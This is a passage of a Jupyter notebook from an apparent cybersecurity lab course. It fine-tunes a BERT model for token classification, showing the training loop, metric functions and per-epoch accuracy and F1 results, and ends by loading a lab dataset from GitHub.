              "      (layer): ModuleList(\n",
              "        (0-11): 12 x BertLayer(\n",
              "          (attention): BertAttention(\n",
              "            (self): BertSdpaSelfAttention(\n",
              "              (query): Linear(in_features=768, out_features=768, bias=True)\n",
              "              (key): Linear(in_features=768, out_features=768, bias=True)\n",
              "              (value): Linear(in_features=768, out_features=768, bias=True)\n",
              "              (dropout): Dropout(p=0.1, inplace=False)\n",
              "            )\n",
              "            (output): BertSelfOutput(\n",
              "              (dense): Linear(in_features=768, out_features=768, bias=True)\n",
              "              (LayerNorm): LayerNorm((768,), eps=1e-12, elementwise_affine=True)\n",
              "              (dropout): Dropout(p=0.1, inplace=False)\n",
              "            )\n",
              "          )\n",
              "          (intermediate): BertIntermediate(\n",
              "            (dense): Linear(in_features=768, out_features=3072, bias=True)\n",
              "            (intermediate_act_fn): GELUActivation()\n",
              "          )\n",
              "          (output): BertOutput(\n",
              "            (dense): Linear(in_features=3072, out_features=768, bias=True)\n",
              "            (LayerNorm): LayerNorm((768,), eps=1e-12, elementwise_affine=True)\n",
              "            (dropout): Dropout(p=0.1, inplace=False)\n",
              "          )\n",
              "        )\n",
              "      )\n",
              "    )\n",
              "  )\n",
              "  (dropout): Dropout(p=0.1, inplace=False)\n",
              "  (classifier): Linear(in_features=768, out_features=7, bias=True)\n",
              ")"
            ]
          },
          "metadata": {},
          "execution_count": 32
        }
      ],
      "source": [
        "pretrained_model = \"google-bert/bert-base-uncased\"\n",
        "# First, get the configuration of the model\n",
        "config = AutoConfig.from_pretrained(\n",
        "    pretrained_model_name_or_path=pretrained_model,\n",
        "    id2label=id2label, # Notice that we are also providing the mapping from ids to labels\n",
        "    label2id=label2id, # And viceversa\n",
        ")\n",
        "# Then initialize the model with random weights using the configuration\n",
        "model = AutoModelForTokenClassification.from_config(config)\n",
        "model"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 141,
          "referenced_widgets": [
            "43478ff37d494e3bb2cc98310c507560",
            "3c7a4237cb53486fa1527e08f65d1ba9",
            "c542179d8ec94d34b4f97349f6199a57",
            "11108f2cd70d42278fd246a8bea8bf24",
            "aa48da5ba70943f3a6079daef170e47b",
            "93ffbf79a21a4b3383a061d87880cc0c",
            "3d9edc1252a04e01b1095681719fa8ce",
            "09a5b395830d41e781e646602467e5e5",
            "a07e57d89ef24e3888d85ee15a229a7e",
            "b53de8a640cf49ba83ae60b0b1e45926",
            "cb603f62fd804741bb0dcca9d4b76f48"
          ]
        },
        "id": "oiJ7fWWh3Cmo",
        "outputId": "8c1b73cc-3538-485f-896b-e45bbca13cf6"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Xet Storage is enabled for this repo, but the 'hf_xet' package is not installed. Falling back to regular HTTP download. For better performance, install the package with: `pip install huggingface_hub[hf_xet]` or `pip install hf_xet`\n",
            "WARNING:huggingface_hub.file_download:Xet Storage is enabled for this repo, but the 'hf_xet' package is not installed. Falling back to regular HTTP download. For better performance, install the package with: `pip install huggingface_hub[hf_xet]` or `pip install hf_xet`\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "model.safetensors:   0%|          | 0.00/440M [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "43478ff37d494e3bb2cc98310c507560"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Some weights of BertForTokenClassification were not initialized from the model checkpoint at google-bert/bert-base-uncased and are newly initialized: ['classifier.bias', 'classifier.weight']\n",
            "You should probably TRAIN this model on a down-stream task to be able to use it for predictions and inference.\n"
          ]
        }
      ],
      "source": [
        "model = AutoModelForTokenClassification.from_pretrained(\n",
        "    pretrained_model_name_or_path=pretrained_model,\n",
        "    id2label=id2label,\n",
        "    label2id=label2id,\n",
        ")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "Q9BD9O-q3Cmo"
      },
      "outputs": [],
      "source": [
        "# We DO NOT WANT to ruin it! Just a \"gentle touch\" > keep your LR small!\n",
        "LR = 1e-5\n",
        "N_TRAIN_EPOCHS = 30\n",
        "# Define optimizer\n",
        "optimizer = AdamW(model.parameters(), lr=LR)\n",
        "\n",
        "num_update_steps_per_epoch = len(train_dataloader)\n",
        "# Total number of training steps: number_batches_x_epoch x number of epochs!\n",
        "num_training_steps = N_TRAIN_EPOCHS * num_update_steps_per_epoch\n",
        "\n",
        "lr_scheduler = get_scheduler(\n",
        "    \"linear\",\n",
        "    optimizer=optimizer,\n",
        "    num_warmup_steps=0,\n",
        "    num_training_steps=num_training_steps,\n",
        ")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "pMrc8dQG3Cmo"
      },
      "outputs": [],
      "source": [
        "def postprocess(predictions, labels):\n",
        "    predictions = predictions.detach().cpu().clone().numpy()\n",
        "    labels = labels.detach().cpu().clone().numpy()\n",
        "    # Remove ignored index (special tokens) and convert to labels\n",
        "    true_labels = [[id2label[l] for l in label if l != -100] for label in labels]\n",
        "    true_predictions = [\n",
        "        [id2label[p] for (p, l) in zip(prediction, label) if l != -100]\n",
        "        for prediction, label in zip(predictions, labels)\n",
        "    ]\n",
        "    return true_labels, true_predictions"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "zrwCfUp53Cmo"
      },
      "outputs": [],
      "source": [
        "def compute_metrics(full_predictions, full_labels):\n",
        "    # Token-level metrics\n",
        "    # Flatten predictions and labels > create a single, long list\n",
        "    flat_predictions = list(chain(*full_predictions))\n",
        "    flat_labels = list(chain(*full_labels))\n",
        "    # Calculate standard classification metrics\n",
        "    token_accuracy = accuracy_score(flat_labels, flat_predictions)\n",
        "    token_precision = precision_score(flat_labels, flat_predictions, average='macro', zero_division=0)\n",
        "    token_recall = recall_score(flat_labels, flat_predictions, average='macro', zero_division=0)\n",
        "    token_f1 = f1_score(flat_labels, flat_predictions, average='macro', zero_division=0)\n",
        "    # Return all metrics in a dictionary\n",
        "    metrics = {\n",
        "        \"token_accuracy\": token_accuracy,\n",
        "        \"token_precision\": token_precision,\n",
        "        \"token_recall\": token_recall,\n",
        "        \"token_f1\": token_f1,\n",
        "    }\n",
        "    return metrics"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "VQt9OU9n3Cmo"
      },
      "outputs": [],
      "source": [
        "best_val_loss, best_epoch = np.inf, 0\n",
        "best_model = deepcopy(model)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "uh-3yvfO3Cmp"
      },
      "outputs": [],
      "source": [
        "device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n",
        "model = model.to(device)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 593,
          "referenced_widgets": [
            "1aa016e30f864660964a1f865a51fca1",
            "7cc725a1bc6246a38170f269e2fe66fa",
            "b6717711bc2749bab6a09b249fc64cfc",
            "b444dd220355435991936b96d1cdb11c",
            "b598f866b0cf4656a8bd1e5adc7f3bd3",
            "d87fea81054a4d43a66de708de299102",
            "f36ec2e42f0040b984805c492216747b",
            "72d8f25d696e44d8a5913888ca1a38a4",
            "8dd82eebf1524a94b86b06cbe544dc32",
            "900039e277db4ea4bad08e6e435e9edf",
            "4b6c94f931bf4b75b5c18ee3c90ca911"
          ]
        },
        "id": "sBFl8D3w3Cmp",
        "outputId": "486fb5d0-eba3-4201-d6aa-025706f587e8"
      },
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "  0%|          | 0/390 [00:00<?, ?it/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "1aa016e30f864660964a1f865a51fca1"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "epoch 0: {'token_accuracy': 0.4953046953046953, 'token_f1': 0.15259234872507157}\n",
            "epoch 1: {'token_accuracy': 0.6945054945054945, 'token_f1': 0.3111082327263256}\n",
            "epoch 2: {'token_accuracy': 0.7418581418581418, 'token_f1': 0.33812736926962245}\n",
            "epoch 3: {'token_accuracy': 0.7326673326673326, 'token_f1': 0.3314644769764348}\n",
            "epoch 4: {'token_accuracy': 0.7514485514485515, 'token_f1': 0.34256076748105496}\n",
            "epoch 5: {'token_accuracy': 0.7746253746253746, 'token_f1': 0.3667250668414085}\n",
            "epoch 6: {'token_accuracy': 0.7916083916083916, 'token_f1': 0.3714614913505712}\n",
            "epoch 7: {'token_accuracy': 0.8025974025974026, 'token_f1': 0.3859014724687667}\n",
            "epoch 8: {'token_accuracy': 0.8193806193806193, 'token_f1': 0.4047884183437954}\n",
            "epoch 9: {'token_accuracy': 0.8191808191808192, 'token_f1': 0.4095132108634588}\n",
            "epoch 10: {'token_accuracy': 0.8237762237762237, 'token_f1': 0.4313050887721987}\n",
            "epoch 11: {'token_accuracy': 0.836963036963037, 'token_f1': 0.4706866597810912}\n",
            "epoch 12: {'token_accuracy': 0.842957042957043, 'token_f1': 0.4828565285262381}\n",
            "epoch 13: {'token_accuracy': 0.8493506493506493, 'token_f1': 0.5102510390949322}\n",
            "epoch 14: {'token_accuracy': 0.8535464535464535, 'token_f1': 0.5285826673267181}\n",
            "epoch 15: {'token_accuracy': 0.8471528471528471, 'token_f1': 0.5194980236807305}\n",
            "epoch 16: {'token_accuracy': 0.85994005994006, 'token_f1': 0.5433518565005081}\n",
            "epoch 17: {'token_accuracy': 0.8561438561438561, 'token_f1': 0.5380993868258371}\n",
            "epoch 18: {'token_accuracy': 0.8575424575424575, 'token_f1': 0.5474741484429875}\n",
            "epoch 19: {'token_accuracy': 0.8605394605394605, 'token_f1': 0.5540660674701076}\n",
            "epoch 20: {'token_accuracy': 0.8621378621378621, 'token_f1': 0.5608241714917551}\n",
            "epoch 21: {'token_accuracy': 0.8631368631368631, 'token_f1': 0.5637385407479224}\n",
            "epoch 22: {'token_accuracy': 0.8621378621378621, 'token_f1': 0.5611248188173447}\n",
            "epoch 23: {'token_accuracy': 0.8641358641358642, 'token_f1': 0.5643791622346427}\n",
            "epoch 24: {'token_accuracy': 0.8647352647352647, 'token_f1': 0.5631611921466969}\n",
            "epoch 25: {'token_accuracy': 0.862937062937063, 'token_f1': 0.5621333138673643}\n",
            "epoch 26: {'token_accuracy': 0.8635364635364635, 'token_f1': 0.5635895261906404}\n",
            "epoch 27: {'token_accuracy': 0.8631368631368631, 'token_f1': 0.5631175175471422}\n",
            "epoch 28: {'token_accuracy': 0.8639360639360639, 'token_f1': 0.5646518439008676}\n",
            "epoch 29: {'token_accuracy': 0.8637362637362638, 'token_f1': 0.5644779385745843}\n"
          ]
        }
      ],
      "source": [
        "progress_bar = tqdm(range(num_training_steps))\n",
        "val_losses, train_losses = [], [] # Lists to keep track of the training and validation losses\n",
        "\n",
        "for epoch in range(N_TRAIN_EPOCHS):\n",
        "    # Training\n",
        "    model.train()\n",
        "    train_loss = 0\n",
        "    for batch in train_dataloader:\n",
        "        batch = {key:value.to(device) for key, value in batch.items()}\n",
        "        # Model expects:\n",
        "        # - input_ids > i.e., which tokens we must map into the embeddings\n",
        "        # - attention_mask > who shall each token pays attention to\n",
        "        # - labels > the NER tags\n",
        "        outputs = model(input_ids=batch[\"input_ids\"],\n",
        "                        attention_mask=batch[\"attention_mask\"],\n",
        "                        labels=batch[\"labels\"]\n",
        "        )\n",
        "        # Notice: the model already comes with a CrossEntropy loss\n",
        "        # - if `labels` are defined, a loss is also computed\n",
        "        loss = outputs.loss\n",
        "        train_loss += loss.detach().cpu().clone().numpy()\n",
        "        loss.backward()\n",
        "        optimizer.step()\n",
        "        lr_scheduler.step()\n",
        "        optimizer.zero_grad()\n",
        "        progress_bar.update(1)\n",
        "    train_losses.append(train_loss/len(train_dataloader))\n",
        "    # Evaluation\n",
        "    model.eval()\n",
        "    full_predictions, full_labels = [], []\n",
        "    val_loss = 0\n",
        "    for batch in eval_dataloader:\n",
        "        batch = {key:value.to(device) for key, value in batch.items()}\n",
        "        with torch.no_grad():\n",
        "            outputs = model(**batch)\n",
        "        val_loss += outputs.loss.detach().cpu().clone().numpy()\n",
        "        # Extract the predictions\n",
        "        predictions = outputs.logits.argmax(dim=-1)\n",
        "        labels = batch[\"labels\"]\n",
        "        true_predictions, true_labels = postprocess(predictions, labels)\n",
        "        full_predictions+=true_predictions\n",
        "        full_labels+=true_labels\n",
        "    val_loss = val_loss/len(eval_dataloader)\n",
        "    val_losses.append(val_loss)\n",
        "    metrics = compute_metrics(full_predictions, full_labels)\n",
        "    print(\n",
        "        f\"epoch {epoch}:\",\n",
        "        {\n",
        "            key: metrics[key]\n",
        "            for key in [\"token_accuracy\", \"token_f1\"]\n",
        "        },\n",
        "    )\n",
        "    if val_loss <= best_val_loss:\n",
        "        best_epoch = epoch\n",
        "        best_val_loss = val_loss\n",
        "        best_model = deepcopy(model)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "0FBenvP43Cmp"
      },
      "source": [
        "## Task 4"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "WJLDUM1K3Cmq"
      },
      "outputs": [],
      "source": [
        "# import the dataset\n",
        "dataset_url = 'https://github.com/PierfrancescoElia/AICyberLabs/raw/refs/heads/main/Lab03/cyberlab.bigcsv'\n",
        "cyberlab_df = pd.read_csv(dataset_url)\n"
      ]
    }
  ]
}